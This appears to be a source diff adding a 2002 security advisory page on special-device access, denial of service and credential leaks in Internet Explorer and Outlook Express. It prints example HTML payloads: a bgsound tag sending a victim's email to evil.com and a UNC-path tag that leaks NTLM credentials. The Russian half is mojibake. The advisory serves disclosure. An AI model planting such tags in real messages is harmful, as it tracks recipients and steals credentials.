@@ -1,0 +1,130 @@
+#define Title "Advisories : special device access and DoS in Microsoft Internet Exporer/Outlook Express/Outlook"
+#include "../include/intro.html"
+<pre><font class="fixed">
+
+Title:             special device access and DoS in Microsoft Internet
+                   Exporer/Outlook Express/Outlook
+Authors:           ERRor, 3APA3A
+Date:              May, 14 2002
+Affected:          Internet Explorer 6.0
+Vendor:            Microsoft
+Risk:              Average to high
+Remote:            Yes
+Exploitable:       Yes
+Vendor notified:   April, 24 2002
+
+Intro:
+
+All  versions  of  Windows have a reserved filenames referred to special
+devices such as prn, aux, nul, etc also called DOS devices. Filename for
+special  device may have any directory path and any extension after dot.
+For  example  c:\temp\prn.tmp  refers to prn device. Same API is used to
+access  special device and regular files. Unauthorized access to special
+device may be significant security issue causing different results: from
+Denial of Service against running program or service to hardware failure
+or secure data compromise.
+
+Problem:
+
+ERRor  discovered  that &lt;BGSOUND&gt; tag in conjunction with special device
+name  causes DoS against Internet Explorer or Outlook Express regardless
+of  security zone settings. For Outlook Express it's untrivial to remove
+malcrafted  message  without losing message folder.
+
+During investigation of this issue it was found by 3APA3A and ERRor that
+using &lt;IFRAME&gt; tag it's possible to send any data to special device.
+
+Another  problem  is  that  regardless  of security zone settings source
+specified in &lt;BGSOUND&gt; tag is always downloaded. It makes it possible to
+fingerprint  remote  client  by his e-mail using something like
+
+&lt;bgsound src="http://evil.com/registerme?email=victim@com.com"&gt;
+
+Remote client fingerprint problem is discussed in [4].
+
+4th problem (reported by Chad Loder <cloder@acm.org>) is that by using
+tag like &lt;bgsound src="\\111.111.111.111\new\file.wav"&gt; it's possible
+to cause IE to establish external NetBIOS connection. Depending   on
+LMCompatibilityLevel  it  may  cause user's cleartext password or NTLMv1
+challenge to leak. It's very serious bug.
+
+Exploitation:
+
+You  can  use  [2] to test DoS against Outlook Express via &lt;BGSOUN&gt;. [3]
+will  print  text  line  on  a  text printer attached to lpt1 in Outlook
+Express 6.0 via &lt;IFRAME&gt;
+
+1. Special device access and DoS in Outlook Express
+   http://www.security.nnov.ru/search/news.asp?binid=2010
+2. Outlook Express Special Device DoS POC
+   http://www.security.nnov.ru/files/iedos/dos.eml
+3. Outlook Express Special Device access POC
+   http://www.security.nnov.ru/files/iedos/print.eml
+4. Security risks assoticated with using e-mail.
+   http://www.security.nnov.ru/articles/uninet/
+
+Vendor:
+
+Microsoft was informed on April, 24, 2002. No feedback from vendor since
+April, 25.
+
+����:                    ������ � ����������� ����������� � Internet Explorer
+������:                  ERRor, 3APA3A
+����:                    14 ��� 2002
+���������:               Microsoft Internet Explorer 6.0
+                         Microsoft Outlook Express 6.0
+�������������:           Microsoft
+���������:               �� ������� �� �������
+��������:                ��
+��������������:          ��
+������������� ���������: 24 ������ 2002
+
+��������:
+
+��  ����  �������  Windows  ���� ����������������� ����� ������, �������
+���������  � ����������� ����������� (���������� ��� �� DOS-����������),
+�����  ���  prn,  aux,  nul  �  �.�. ��� ���������� �� ������� �� ���� �
+��������,   ����������  �����  �  �.�.  (�.�.  c:\temp\prn.tmp  ��������
+�����������  �����������  prn).  ��� ������ �� ������������ ������������
+�����������   ���   ��   API  ���  �  ���  ������  �  ��������  �������.
+�������������������  ������  �  ����������� ����������� ����� �������� �
+���������  ����������  ������������ ������� � ������������ ������ ������
+���  ���������,  ������������  �������  �������  �  �����  �  ����������
+������������ ����������� ���������� ��� �������������� ������ ������.
+
+�������� ��������:
+
+ERRor ���������, ��� � ������� ���� &lt;BGSOUND&gt; � ��������� �� �����������
+������  ����������  �����  �������  ���������  Outlook Express. ��� ����
+�����������  ���������  �  �������  ���������  ���  ������  ������ �����
+�������� ������������� �������.
+
+��  �����  ������������  ���� �������� ���� ��������, ��� � ������� ����
+&lt;IFRAME&gt; ����� ������� ����� ������ � ����������� ����������.
+
+���  ��,  ���������  ��������  ��,  ���  ��������  ����  ����  &lt;BGSOUND&gt;
+�����������  ������  �  �������  �����  ����������  ��  ���������  ����
+������������. ��� ������ ��������� "�����������" ������� � �������
+&lt;bgsound src="http://evil.com/registerme?email=victim@com.com"&gt;
+�������� ��������� �������� � ������� ����������� � [4].
+
+��� ���� ��������, � ������� ������� Chad Loder <cloder@acm.org> ��� ��,
+��� ��������� ��� ���� lt;bgsound src="\\111.111.111.111\new\file.wav"&gt;
+����� ��������� Internet Explorer ���������� ������� NetBIOS ����������
+��� ������� ������������� ����� �������� ������� ������ ������������. ���
+�������� ������������ ��������.
+
+�������������:
+
+�  [2] ������ ������ DoS-����� ������ Outlook Express ����� &lt;BGSOUND&gt;. �
+[3]  ���������  ���������  ������  ��  ������� ������������ � ����� lpt1
+����� &lt;IFRAME&gt;.
+
+�������������:
+
+Microsoft  ���  ���������������  24  ������  2002 ����. �� ���� ��������
+��������� �� ������ �������� � 25 ������.
+
+</pre></font>
+
+#include "../include/postpage.html"
